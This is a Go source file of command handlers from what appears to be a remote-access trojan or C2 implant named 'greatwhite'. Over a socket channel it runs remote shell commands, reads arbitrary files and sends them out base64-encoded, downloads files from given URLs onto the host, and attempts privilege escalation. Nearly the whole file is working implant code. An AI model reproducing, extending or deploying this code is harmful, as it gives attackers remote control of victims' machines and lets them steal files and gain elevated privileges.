package commands

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/whiterabb17/greatwhite/modules/util"

	gophersocket "github.com/whiterabb17/gopher-socket"
	"github.com/whiterabb17/greatwhite/modules/models"
)

const (
	fmtPing = "Pong!\nRequest took %s"
	fmtRoot = "Elevation failed: %s"
)

func Ping(c *gophersocket.Channel, message string, selfTag string) {
	back := time.Now()
	c.Emit("repl", models.Resp{Resp: "!Pong", Tag: selfTag})
	c.Emit("repl", models.Resp{Resp: fmt.Sprintf(fmtPing, time.Since(back)), Tag: selfTag})
}

func Shell(command string, c *gophersocket.Channel, selfTag string) {
	shell(command, c, selfTag)
}

// UploadFile handles /file commands by checking for and uploading a file.
func UploadFile(file string, c *gophersocket.Channel, selfTag string) {
	fi, err := os.Stat(file)
	if os.IsNotExist(err) {
		c.Emit("error", models.Resp{Resp: "The specified file does not exist.", Tag: selfTag})

	}
	if fi.IsDir() {
		c.Emit("error", models.Resp{Resp: "This command expects a file, not a directory.", Tag: selfTag})

	}
	fbyte, _ := os.ReadFile(file)
	c.Emit("file", models.Mail{Buffer: util.SSt64(fbyte), Uid: selfTag})
}

// Download attempts do download a file and save it.
func Download(args string, c *gophersocket.Channel, selfTag string) {
	arr := strings.SplitN(args, " ", 2)
	url, fn := arr[0], arr[1]

	res, err := http.Get(url)
	if err != nil {
		c.Emit("repl", models.Resp{Resp: "Error: " + err.Error(), Tag: selfTag})

	}
	defer res.Body.Close()

	file, err := os.Create(fn)
	if err != nil {
		c.Emit("repl", models.Resp{Resp: "Error: " + err.Error(), Tag: selfTag})

	}
	defer file.Close()

	_, err = io.Copy(file, res.Body)
	if err != nil {
		c.Emit("repl", models.Resp{Resp: "Error: " + err.Error(), Tag: selfTag})
	} else {
		c.Emit("repl", models.Resp{Resp: fmt.Sprintf("File saved as `%s`", strings.ReplaceAll(fn, "`", "\\`")), Tag: selfTag})
	}

}

// Command handler for /root
func Elevate(c *gophersocket.Channel, selfTag string) {
	err := util.ElevateLogic()
	var fin string
	if err == nil {
		fin = "Elevation successful"
	} else {
		fin = "Elevation Failed: " + err.Error()
	}
	c.Emit("repl", models.Resp{Resp: fin, Tag: selfTag})

}
